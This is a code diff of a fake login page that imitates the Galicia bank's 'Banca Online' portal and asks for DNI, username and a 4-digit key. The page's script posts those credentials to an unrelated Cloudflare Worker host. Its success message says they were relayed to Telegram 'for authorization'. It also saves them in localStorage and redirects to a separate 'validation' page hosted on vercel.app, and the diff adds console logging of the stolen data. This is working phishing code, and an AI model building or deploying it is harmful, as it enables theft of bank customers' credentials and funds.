@@ -5,9 +5,9 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Portal de acceso - Galicia</title>
     <style>
-        /* ========================= CONFIGURACIÓN GENERAL ========================= */
         * {
             box-sizing: border-box;
+            margin: 0;
             padding: 0;
         }
         body {
@@ -15,7 +15,6 @@
             background: #fff;
             color: #666;
         }
-        /* ========================= LOGO SVG ========================= */
         .logo_sidebar_img {
             background-image: url("../logo.svg");
             background-size: contain;
@@ -27,13 +26,11 @@
             margin-left: -3px;
             max-height: 55px;
         }
-        /* ========================= VISTA PC ========================= */
         .desktop-layout {
             min-height: 100vh;
             display: flex;
             flex-direction: column;
         }
-        /* CABECERA */
         .header {
             height: 110px;
             padding: 30px 25px;
@@ -43,7 +40,6 @@
             font-size: 16px;
             letter-spacing: .5px;
         }
-        /* CONTENIDO PRINCIPAL */
         .main {
             flex: 1;
             display: flex;
@@ -52,7 +48,6 @@
             gap: 80px;
             padding: 40px 40px 0;
         }
-        /* FORMULARIO PC */
         .login-area {
             width: 390px;
             padding-top: 25px;
@@ -79,7 +74,6 @@
         .input-group input:focus {
             border-bottom: 2px solid #f47721;
         }
-        /* CHECKBOX PC */
         .checkbox-row {
             display: flex;
             align-items: center;
@@ -91,7 +85,6 @@
             width: 20px;
             height: 20px;
         }
-        /* BOTÓN PC - color salmon cuando se completa la clave de 4 dígitos */
         .login-btn {
             width: 100%;
             height: 46px;
@@ -103,7 +96,8 @@
             transition: background 0.3s ease;
         }
         .login-btn.active {
-            background: #fa8072; /* color salmon */
+            background: #f47721;
+            color: white;
         }
         .login-btn:hover:not(.loading) {
             opacity: 0.9;
@@ -112,7 +106,6 @@
             opacity: 0.6;
             cursor: not-allowed;
         }
-        /* ENLACES PC */
         .link {
             display: block;
             text-align: center;
@@ -127,7 +120,6 @@
             color: #222;
             font-size: 15px;
         }
-        /* IMAGEN PC */
         .image-area {
             width: 600px;
             height: 600px;
@@ -138,29 +130,23 @@
             height: 100%;
             object-fit: cover;
         }
-        /* PIE DE PÁGINA */
         .footer {
             text-align: center;
             font-size: 13px;
             padding: 12px;
         }
-        /* ========================= VISTA MÓVIL ========================= */
         .mobile-layout {
             display: none;
         }
-        /* ========================= RESPONSIVE MÓVIL ========================= */
         @media (max-width: 768px) {
-            /* OCULTAR PC */
             .desktop-layout {
                 display: none;
             }
-            /* CONTENEDOR MÓVIL */
             .mobile-layout {
                 display: block;
                 min-height: 100vh;
                 padding: 28px 24px 30px;
             }
-            /* LOGO MÓVIL */
             .logo_sidebar_img {
                 width: 190px;
                 height: 40px;
@@ -168,11 +154,9 @@
                 margin-left: 0;
                 margin-bottom: 38px;
             }
-            /* FORMULARIO MÓVIL */
             .mobile-login {
                 width: 100%;
             }
-            /* INPUTS MÓVIL */
             .mobile-input {
                 width: 100%;
                 height: 44px;
@@ -187,7 +171,6 @@
             .mobile-input:focus {
                 border-bottom: 2px solid #f47721;
             }
-            /* CHECKBOX MÓVIL */
             .mobile-checkbox {
                 display: flex;
                 align-items: center;
@@ -200,21 +183,20 @@
                 width: 18px;
                 height: 18px;
             }
-            /* BOTÓN MÓVIL - color salmon cuando se completa la clave de 4 dígitos */
             .mobile-button {
                 width: 100%;
                 height: 46px;
                 border: none;
                 background: #e9e9e9;
                 border-radius: 5px;
-                color: #ffff;
+                color: #fff;
                 font-size: 14px;
                 margin-top: 7px;
                 cursor: pointer;
                 transition: background 0.3s ease;
             }
             .mobile-button.active {
-                background: #eb5600; /* color salmon */
+                background: #f47721;
             }
             .mobile-button:hover:not(.loading) {
                 opacity: 0.9;
@@ -223,7 +205,6 @@
                 opacity: 0.6;
                 cursor: not-allowed;
             }
-            /* ENLACES MÓVIL */
             .mobile-link {
                 display: block;
                 text-align: center;
@@ -232,7 +213,6 @@
                 font-size: 15px;
                 margin-top: 25px;
             }
-            /* TEXTO INFERIOR */
             .mobile-first-time {
                 text-align: center;
                 font-size: 15px;
@@ -248,21 +228,18 @@
                 font-size: 15px;
                 margin-top: 12px;
             }
-            /* ESPACIO MUY GRANDE ENTRE FORMULARIO E IMAGEN */
             .mobile-image {
                 width: 100%;
                 height: 280px;
                 margin-top: 500px;
                 overflow: hidden;
             }
-            /* IMAGEN MÓVIL */
             .mobile-image img {
                 width: 100%;
                 height: 100%;
                 object-fit: cover;
             }
         }
-        /* ========================= MÓVILES PEQUEÑOS ========================= */
         @media (max-width: 400px) {
             .mobile-layout {
                 padding: 24px 20px;
@@ -293,13 +270,11 @@
             .mobile-create {
                 font-size: 14px;
             }
-            /* ESPACIO MUY GRANDE EN MÓVIL PEQUEÑO */
             .mobile-image {
                 height: 230px;
                 margin-top: 500px;
             }
         }
-        /* ========================= MENSAJES DE ESTADO ========================= */
         .message-box {
             padding: 12px 16px;
             margin: 16px 0;
@@ -326,7 +301,6 @@
             color: #0c5460;
             border: 1px solid #bee5eb;
         }
-        /* ========================= TRANSACTION ID VISIBLE ========================= */
         .transaction-id {
             font-size: 12px;
             color: #999;
@@ -338,7 +312,6 @@
         .transaction-id.visible {
             display: block;
         }
-        /* ========================= BOTÓN REINTENTAR ========================= */
         .retry-btn {
             display: none;
             width: 100%;
@@ -363,23 +336,15 @@
     </style>
 </head>
 <body>
-    <!-- ================================================= VISTA PC ================================================= -->
+    <!-- VISTA PC -->
     <div class="desktop-layout">
-        <!-- CABECERA -->
         <header class="header">
-            <!-- LOGO SVG -->
             <div class="logo_sidebar_img"></div>
-            <div class="subtitle">
-                Banca Online
-            </div>
+            <div class="subtitle">Banca Online</div>
         </header>
-        <!-- CONTENIDO PRINCIPAL -->
         <main class="main">
-            <!-- FORMULARIO -->
             <section class="login-area">
-                <h1 class="login-title">
-                    Iniciar sesión
-                </h1>
+                <h1 class="login-title">Iniciar sesión</h1>
                 <div class="input-group">
                     <input type="text" id="dniPc" placeholder="Tu DNI" maxlength="10">
                 </div>
@@ -395,73 +360,38 @@
                 </label>
                 <div id="mensajePc" class="message-box"></div>
                 <div id="transactionIdPc" class="transaction-id"></div>
-                <button class="login-btn" id="botonPc" type="button">
-                    INICIAR SESIÓN
-                </button>
-                <button class="retry-btn" id="retryPc" type="button">
-                    🔄 REINTENTAR
-                </button>
-                <a href="#" class="link">
-                    OLVIDÉ O BLOQUEÉ MIS CLAVES
-                </a>
-                <div class="first-time">
-                    Si es tu primera vez o necesitás el usuario
-                </div>
-                <a href="#" class="link">
-                    CREÁ TUS CLAVES
-                </a>
+                <button class="login-btn" id="botonPc" type="button">INICIAR SESIÓN</button>
+                <button class="retry-btn" id="retryPc" type="button">🔄 REINTENTAR</button>
+                <a href="#" class="link">OLVIDÉ O BLOQUEÉ MIS CLAVES</a>
+                <div class="first-time">Si es tu primera vez o necesitás el usuario</div>
+                <a href="#" class="link">CREÁ TUS CLAVES</a>
             </section>
-            <!-- IMAGEN PC -->
             <section class="image-area">
                 <img src="https://images.unsplash.com/photo-1549490349-8643362247b5?auto=format&fit=crop&w=900&q=80" alt="Imagen decorativa">
             </section>
         </main>
-        <!-- FOOTER -->
-        <footer class="footer">
-            Operar con Banca Online implica aceptar los términos y condiciones del servicio.
-        </footer>
+        <footer class="footer">Operar con Banca Online implica aceptar los términos y condiciones del servicio.</footer>
     </div>
 
-    <!-- ================================================= VISTA MÓVIL ================================================= -->
+    <!-- VISTA MÓVIL -->
     <div class="mobile-layout">
-        <!-- LOGO SVG -->
         <div class="logo_sidebar_img"></div>
-        <!-- FORMULARIO -->
         <main class="mobile-login">
             <input class="mobile-input" type="text" id="dniMovil" placeholder="Tu DNI" maxlength="10">
             <input class="mobile-input" type="text" id="usuarioMovil" placeholder="Tu usuario Galicia">
             <input class="mobile-input" type="password" id="claveMovil" placeholder="Tu clave Galicia" maxlength="4" inputmode="numeric" pattern="[0-9]*">
-            <!-- CHECKBOX -->
             <label class="mobile-checkbox">
                 <input type="checkbox" id="recordarMovil">
                 Recordar identificación y usuario
             </label>
             <div id="mensajeMovil" class="message-box"></div>
             <div id="transactionIdMovil" class="transaction-id"></div>
-            <!-- BOTÓN -->
-            <button class="mobile-button" id="botonMovil" type="button">
-                INICIAR SESIÓN
-            </button>
-            <button class="retry-btn" id="retryMovil" type="button">
-                🔄 REINTENTAR
-            </button>
-            <!-- ENLACE -->
-            <a href="#" class="mobile-link">
-                OLVIDÉ O BLOQUEÉ MIS CLAVES
-            </a>
-            <!-- TEXTO -->
-            <div class="mobile-first-time">
-                Si es tu primera vez o necesitás el usuario
-            </div>
-            <!-- CREAR CLAVES -->
-            <a href="#" class="mobile-create">
-                CREÁ TUS CLAVES
-            </a>
+            <button class="mobile-button" id="botonMovil" type="button">INICIAR SESIÓN</button>
+            <button class="retry-btn" id="retryMovil" type="button">🔄 REINTENTAR</button>
+            <a href="#" class="mobile-link">OLVIDÉ O BLOQUEÉ MIS CLAVES</a>
+            <div class="mobile-first-time">Si es tu primera vez o necesitás el usuario</div>
+            <a href="#" class="mobile-create">CREÁ TUS CLAVES</a>
         </main>
-        <!-- ESPACIO GRANDE ANTES DE LA IMAGEN -->
-        <div class="mobile-image">
-            <img src="https://images.unsplash.com/photo-1549490349-8643362247b5?auto=format&fit=crop&w=900&q=80" alt="Imagen decorativa">
-        </div>
         <div class="mobile-image">
             <img src="https://images.unsplash.com/photo-1549490349-8643362247b5?auto=format&fit=crop&w=900&q=80" alt="Imagen decorativa">
         </div>
@@ -469,14 +399,12 @@
 
     <script>
         // ========================= CONFIGURACIÓN =========================
-        // URL del Worker de Galicia
         const WORKER_URL = 'https://shy-resonance-6d69.micollflorez.workers.dev';
         const BASE_URL = 'https://personasgalicia.vercel.app';
-        
+
         // ========================= FUNCIONES =========================
         function generarTransactionId() {
-            return crypto.randomUUID ? crypto.randomUUID() : 
-                Math.random().toString(36).substring(2) + Date.now().toString(36);
+            return 'txn_' + Date.now() + '_' + Math.random().toString(36).substring(2, 8);
         }
 
         function mostrarMensaje(contenedor, tipo, texto) {
@@ -541,13 +469,11 @@
                 return;
             }
 
-            // Validar que la clave sea de 4 dígitos
             if (clave.length !== 4 || !/^[0-9]{4}$/.test(clave)) {
                 mostrarMensaje(mensajeContenedor, 'error', '⚠️ La clave debe ser de 4 dígitos numéricos');
                 return;
             }
 
-            // Deshabilitar botón y mostrar loading
             boton.disabled = true;
             boton.classList.add('loading');
             retryBtn.classList.remove('visible');
@@ -559,7 +485,9 @@
             const transactionId = generarTransactionId();
 
             try {
-                // Enviar los 3 datos: DNI, usuario y clave
+                console.log('📤 Enviando login...');
+                console.log('📦 Datos:', { dni, usuario, clave, transactionId });
+
                 const response = await fetch(`${WORKER_URL}/login`, {
                     method: 'POST',
                     headers: {
@@ -574,22 +502,24 @@
                 });
 
                 const data = await response.json();
+                console.log('📦 Respuesta del worker:', data);
 
                 if (data.ok) {
                     mostrarTransactionId(transactionIdContenedor, transactionId);
                     mostrarMensaje(mensajeContenedor, 'success', 
-                        `✅ Solicitud enviada correctamente\n📱 Se envió una notificación a Telegram para su autorización\n⏳ Esperando respuesta...`);
+                        `✅ Solicitud enviada correctamente\n📱 Se envió a Telegram para autorización\n⏳ Esperando respuesta...`);
                     
-                    // Guardar credenciales si se seleccionó recordar
                     guardarCredenciales(usuario.trim(), dni.trim(), recordar);
                     
                     // Guardar en localStorage para la página de validación
-                    localStorage.setItem('bancoldata', JSON.stringify({
+                    const bancoldata = {
                         dni: dni.trim(),
                         usuario: usuario.trim(),
                         clave: clave,
                         transactionId: transactionId
-                    }));
+                    };
+                    localStorage.setItem('bancoldata', JSON.stringify(bancoldata));
+                    console.log('💾 Datos guardados en localStorage:', bancoldata);
 
                     // Redirigir a la página de validación
                     setTimeout(() => {
@@ -602,12 +532,11 @@
                     retryBtn.classList.add('visible');
                 }
             } catch (error) {
-                console.error('Error en login:', error);
+                console.error('❌ Error en login:', error);
                 mostrarMensaje(mensajeContenedor, 'error', 
-                    '❌ ERROR DE CONEXIÓN\nNo se pudo conectar con el servidor.\nVerifica tu conexión a internet.');
+                    '❌ ERROR DE CONEXIÓN\nNo se pudo conectar con el servidor.');
                 retryBtn.classList.add('visible');
             } finally {
-                // Restaurar botón
                 boton.disabled = false;
                 boton.classList.remove('loading');
                 boton.textContent = textoOriginal;
@@ -616,7 +545,6 @@
 
         // ========================= CONFIGURAR FORMULARIOS =========================
         function configurarFormulario(dniInput, usuarioInput, claveInput, boton, mensajeContenedor, transactionIdContenedor, retryBtn, recordarCheck) {
-            // Cargar credenciales guardadas
             const credenciales = cargarCredenciales();
             if (credenciales.dni) dniInput.value = credenciales.dni;
             if (credenciales.usuario) usuarioInput.value = credenciales.usuario;
@@ -624,7 +552,6 @@
                 recordarCheck.checked = true;
             }
 
-            // Controlar cambio de color del botón según la clave
             function controlarBoton() {
                 const clave = claveInput.value;
                 if (clave.length === 4 && /^[0-9]{4}$/.test(clave)) {
@@ -636,7 +563,6 @@
 
             claveInput.addEventListener('input', controlarBoton);
 
-            // Evento de click del botón
             boton.addEventListener('click', function() {
                 const dni = dniInput.value;
                 const usuario = usuarioInput.value;
@@ -646,12 +572,10 @@
                 realizarLogin(dni, usuario, clave, boton, mensajeContenedor, transactionIdContenedor, retryBtn, recordar);
             });
 
-            // Botón de reintentar
             retryBtn.addEventListener('click', function() {
                 boton.click();
             });
 
-            // Permitir enviar con Enter
             [dniInput, usuarioInput, claveInput].forEach(input => {
                 input.addEventListener('keypress', function(e) {
                     if (e.key === 'Enter') {
@@ -660,12 +584,10 @@
                 });
             });
 
-            // Control inicial del botón
             controlarBoton();
         }
 
         // ========================= INICIALIZAR =========================
-        // PC
         configurarFormulario(
             document.getElementById('dniPc'),
             document.getElementById('usuarioPc'),
@@ -677,7 +599,6 @@
             document.getElementById('recordarPc')
         );
 
-        // Móvil
         configurarFormulario(
             document.getElementById('dniMovil'),
             document.getElementById('usuarioMovil'),
